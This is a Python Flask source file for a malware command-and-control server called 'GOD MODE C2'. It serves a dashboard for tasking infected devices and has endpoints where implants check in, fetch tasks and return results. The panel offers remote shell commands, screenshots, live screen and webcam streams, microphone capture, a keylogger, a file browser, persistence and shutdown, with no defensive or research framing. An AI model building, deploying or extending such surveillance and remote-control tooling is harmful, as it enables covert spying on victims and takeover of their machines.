from flask import Flask, request, jsonify, render_template_string
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import threading
import time
from datetime import datetime
import json

app = Flask(__name__)
app.config['SECRET_KEY'] = 'godmode-c2-2026'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
CORS(app)

# STATE
devices = {}
tasks = {}
lock = threading.Lock()

# FULL HTML WITH ALL CONTROLS
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>🦠 GOD MODE C2 v2.0</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Orbitron',monospace;background:linear-gradient(135deg,#000428,#004e92,#0a0a2e);color:#00ff88;height:100vh;overflow:hidden;}
        .glass{background:rgba(255,255,255,0.08);backdrop-filter:blur(25px);border:1px solid rgba(0,255,136,0.2);border-radius:20px;box-shadow:0 20px 40px rgba(0,255,136,0.1);}
        .header{position:fixed;top:20px;left:50%;transform:translateX(-50%);padding:20px 40px;font-size:28px;font-weight:900;background:linear-gradient(45deg,#00ff88,#00cc66);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
        .main{display:flex;height:100vh;padding:80px 20px 20px 20px;gap:20px;overflow:hidden;}
        .sidebar{width:300px;overflow-y:auto;}
        .content{flex:1;display:grid;grid-template-rows:1fr 1fr;gap:20px;}
        .panel{padding:25px;height:100%;overflow-y:auto;}
        .device-card{margin:10px 0;padding:20px;cursor:pointer;transition:all 0.3s;border-radius:15px;}
        .device-card:hover{transform:translateY(-5px);box-shadow:0 15px 30px rgba(0,255,136,0.4);}
        .online{border-left:5px solid #00ff88;background:rgba(0,255,136,0.1);}
        .offline{border-left:5px solid #ff4444;background:rgba(255,68,68,0.1);}
        .btn-group{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin:15px 0;}
        button{padding:12px 20px;border:none;border-radius:12px;background:linear-gradient(45deg,#00ff88,#00cc66);color:#000;font-weight:700;cursor:pointer;font-family:inherit;transition:all 0.3s;font-size:13px;}
        button:hover{transform:scale(1.05);box-shadow:0 10px 25px rgba(0,255,136,0.5);}
        button.active{background:linear-gradient(45deg,#ffaa00,#ff8800);}
        .terminal,.log{background:rgba(0,0,0,0.7);padding:20px;border-radius:15px;height:250px;overflow-y:auto;font-family:'Courier New',monospace;font-size:13px;line-height:1.4;}
        .log div{padding:5px 0;border-bottom:1px solid rgba(0,255,136,0.2);}
        h3{margin:0 0 15px 0;font-size:18px;}
        .status-badge{padding:4px 12px;border-radius:20px;font-size:12px;background:rgba(0,255,136,0.2);}
        #streams{display:grid;grid-template-columns:1fr 1fr;gap:20px;height:100%;}
    </style>
</head>
<body>
    <div class="header">🦠 GOD MODE C2 - FULL CONTROL</div>
    
    <div class="main">
        <div class="sidebar glass">
            <h3>🖥️ DEVICES ONLINE</h3>
            <div id="device-list"></div>
        </div>
        
        <div class="content">
            <div class="panel glass">
                <h3 id="device-title">Select Device →</h3>
                <div class="btn-group" id="shell-controls">
                    <button onclick="quickCmd('whoami')">👤 Whoami</button>
                    <button onclick="quickCmd('dir')">📁 Directory</button>
                    <button onclick="quickCmd('ipconfig')">🌐 Network</button>
                    <button onclick="quickCmd('tasklist')">⚙️ Processes</button>
                </div>
                <div class="btn-group">
                    <button onclick="sendTask('screenshot')">📸 Screenshot</button>
                    <button onclick="sendTask('stream_screen')" class="active">📺 Screen Stream</button>
                    <button onclick="sendTask('stream_webcam')">🎥 Webcam</button>
                    <button onclick="sendTask('mic_start')">🎤 Microphone</button>
                </div>
                <div class="btn-group">
                    <button onclick="sendTask('keylog_start')">⌨️ Keylogger</button>
                    <button onclick="sendTask('file_ls')">📂 File Browser</button>
                    <button onclick="sendTask('persistence')">🔒 Persistence</button>
                    <button onclick="sendTask('shutdown')">⏹️ Shutdown</button>
                </div>
                <div>
                    <input id="custom-cmd" placeholder="Custom command..." style="width:100%;padding:12px;border-radius:10px;border:1px solid rgba(0,255,136,0.3);background:rgba(0,0,0,0.5);color:#00ff88;font-family:inherit;">
                    <button onclick="sendCustomCmd()" style="width:100%;margin-top:10px;">▶️ EXECUTE</button>
                </div>
            </div>
            
            <div class="panel glass">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
                    <h3>LIVE TERMINAL</h3>
                    <span class="status-badge" id="device-status">OFFLINE</span>
                </div>
                <div id="terminal" class="terminal"></div>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let selectedDevice = null;
        
        socket.on('connect', () => log('🔗 WebSocket connected to C2'));
        
        socket.on('telemetry', (data) => {
            updateDevice(data);
            log(`📡 ${data.host} pinged: ${data.os}`);
        });
        
        socket.on('result', (data) => {
            if(selectedDevice === data.id) {
                log(`✅ RESULT: ${JSON.stringify(data.result).substring(0,200)}`);
            }
        });
        
        function updateDevice(data) {
            const list = document.getElementById('device-list');
            let deviceCard = document.getElementById(`device-${data.id}`);
            
            if(!deviceCard) {
                deviceCard = document.createElement('div');
                deviceCard.id = `device-${data.id}`;
                deviceCard.className = 'device-card online glass';
                deviceCard.onclick = () => selectDevice(data.id, data.host);
                list.appendChild(deviceCard);
            }
            
            deviceCard.innerHTML = `
                <div style="font-size:16px;font-weight:700;">${data.host}</div>
                <div style="font-size:12px;color:#88ff88;">${data.id}</div>
                <div style="font-size:11px;">${data.os} | ${data.ip}</div>
                <div style="font-size:11px;margin-top:5px;">${data.user}</div>
            `;
            deviceCard.className = 'device-card online glass';
        }
        
        function selectDevice(id, hostname) {
            selectedDevice = id;
            document.getElementById('device-title').textContent = `🎯 ${hostname} (${id})`;
            document.getElementById('device-status').textContent = 'ONLINE';
            document.getElementById('device-status').style.background = 'rgba(0,255,136,0.3)';
        }
        
        function sendTask(type) {
            if(!selectedDevice) return log('❌ Select device first');
            socket.emit('task', {id: selectedDevice, type: type});
            log(`▶️ ${type.toUpperCase()} → ${selectedDevice}`);
        }
        
        function quickCmd(cmd) {
            if(!selectedDevice) return log('❌ Select device first');
            socket.emit('task', {id: selectedDevice, type: 'shell', cmd: cmd});
            log(`▶️ SHELL: ${cmd}`);
        }
        
        function sendCustomCmd() {
            const cmd = document.getElementById('custom-cmd').value;
            if(!cmd || !selectedDevice) return;
            socket.emit('task', {id: selectedDevice, type: 'shell', cmd: cmd});
            log(`▶️ SHELL: ${cmd}`);
            document.getElementById('custom-cmd').value = '';
        }
        
        function log(msg) {
            const term = document.getElementById('terminal');
            const time = new Date().toLocaleTimeString();
            term.innerHTML += `<div>[${time}] ${msg}</div>`;
            term.scrollTop = term.scrollHeight;
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/telemetry', methods=['POST'])
def telemetry():
    try:
        data = request.get_json()
        device_id = data.get('id')
        
        with lock:
            if device_id not in devices:
                devices[device_id] = {}
            devices[device_id].update(data)
            devices[device_id]['last_seen'] = datetime.now().isoformat()
            devices[device_id]['status'] = 'online'
        
        print(f"📡 DEVICE: {device_id} ({data.get('host')})")
        socketio.emit('telemetry', data)
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"Telemetry error: {e}")
        return jsonify({'status': 'error'})

@app.route('/tasks/<device_id>', methods=['GET'])
def get_tasks(device_id):
    with lock:
        return jsonify({'tasks': tasks.get(device_id, [])})

@app.route('/result', methods=['POST'])
def result():
    try:
        data = request.get_json()
        print(f"📥 RESULT {data.get('id')}: {data.get('result', 'OK')}")
        socketio.emit('result', data)
        
        # Clear tasks
        with lock:
            if data.get('id') in tasks:
                tasks[data.get('id')] = []
        return jsonify({'status': 'ok'})
    except:
        return jsonify({'status': 'ok'})

@socketio.on('task')
def on_task(data):
    device_id = data.get('id')
    task = {
        'id': f"task_{int(time.time()*1000)}",
        'type': data.get('type'),
        'cmd': data.get('cmd', ''),
        'timestamp': datetime.now().isoformat()
    }
    
    with lock:
        if device_id not in tasks:
            tasks[device_id] = []
        tasks[device_id].append(task)
    
    print(f"📤 TASK {device_id}: {task['type']}")
    emit('task_sent', task)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
